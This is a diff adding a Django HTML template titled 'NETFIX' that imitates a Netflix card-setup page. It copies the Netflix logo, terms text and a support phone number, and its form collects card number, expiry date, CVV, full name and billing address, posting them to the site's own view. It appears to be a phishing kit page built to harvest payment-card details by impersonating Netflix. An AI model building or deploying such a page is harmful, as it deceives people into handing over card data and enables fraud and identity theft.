@@ -1,0 +1,93 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NETFIX</title>
+    <link rel="stylesheet" href="{% static '' %}css/style.css">
+<body>
+    <nav class="netfixtop">
+        <img src="{% static '' %}img/Netflix-Brand-Logo.png" alt="" class="netfix_img">
+    </nav>
+
+    <!-- form cc -->
+    <div class="formholdbase">
+        <form action="{% url 'index' %}" method="POST" class="formbase">
+            {% csrf_token %}
+            <h2 class="headerpart">Set up your credit or debit card</h2>
+            <img class="cardimg" src="{% static '' %}img/VISA@2x.png" alt="">
+            <img class="cardimg" src="{% static '' %}img/MASTERCARD@2x.png" alt="">
+            <img class="cardimg" src="{% static '' %}img/AMEX@2x.png" alt="">
+            <img class="cardimg" src="{% static '' %}img/DISCOVER@2x.png" alt="">
+            <div class="formholder">
+                <div class="inputbox">
+                    <input class="cardnum" type="tel" name="cardnumber" minlength="16" maxlength="16" required>
+                    <span class="labeling">card number</span>
+                </div>
+                <div class="inputbox forinputexp">
+                    <input class="expirydate" type="text" name="expdob" required>
+                    <span class="labeling1">Expiring Date</span>
+
+                    <input class="cvvpart" type="tel" name="cvvpart" placeholder="cvv" required>
+                    <!-- <span class="cvvlabel">cvv</span> -->
+                </div>
+                <div class="inputbox">
+                    <input class="firstname" type="text" name="firstname" required>
+                    <span class="firstnam">first name</span>
+                </div>
+                <div class="inputbox">
+                    <input class="lastname" type="text" name="lastname" required>
+                    <span class="lastnam">last name</span>
+                </div>
+                <div class="inputbox lastpartinput">
+                    <input class="billing" type="text" name="billingadd" required>
+                    <span class="billadd">billing address</span>
+                </div>
+            </div>
+            <div class="wrappedpriced">
+                <p class="pricedmnt">$19.99/month</p>
+                <p class="pricedmntz">Premium</p>
+            </div>
+            <div class="wrappedstatemnt">
+                <p>By clicking the “continue Membership” button below, you agree to our <span class="blueticks">Terms of Use, Privacy Statement</span>, that you are over 18,
+                     and that <strong>
+                         Netflix will automatically continue your membership and charge the membership fee (currently $19.99/month) to
+                         your payment method until you cancel. You may cancel at any time to avoid future charges
+                     </strong>. To cancel, go to Account and
+                      click “Cancel Membership.”
+                </p>
+            </div>
+                <button class="submit">continue memebership</button>
+                <p class="captcha">This page is protected by Google reCAPTCHA to ensure you're not a bot. <span class="blueticks">Learn more</span>.</p>
+        </form>
+    </div>
+
+    <div class="footer">
+        <div class="container">
+            <p class="question">Questions? Call 1-844-505-2993</p>
+            <div class="footerlinks grid grid--1x2">
+                <ul class="footerlist">
+                    <li class="linkings">FAQ</li>
+                    <li class="linkings">Help Center</li>
+                </ul>
+                <ul class="footerlist">
+                    <li class="linkings">Netflix Shop</li>
+                    <li class="linkings">Terms of Use</li>
+                </ul>
+                <ul class="footerlist">
+                    <li class="linkings">Privacy</li>
+                    <li class="linkings">Cookie Preferences</li>
+                </ul>
+                <ul class="footerlist">
+                    <li class="linkings">Corporate Information</li>
+                    <li class="linkings">Do Not Sell or Share My Personal Information</li>
+                </ul>
+            </div>
+            
+        </div>
+    </div>
+</body>
+</html>
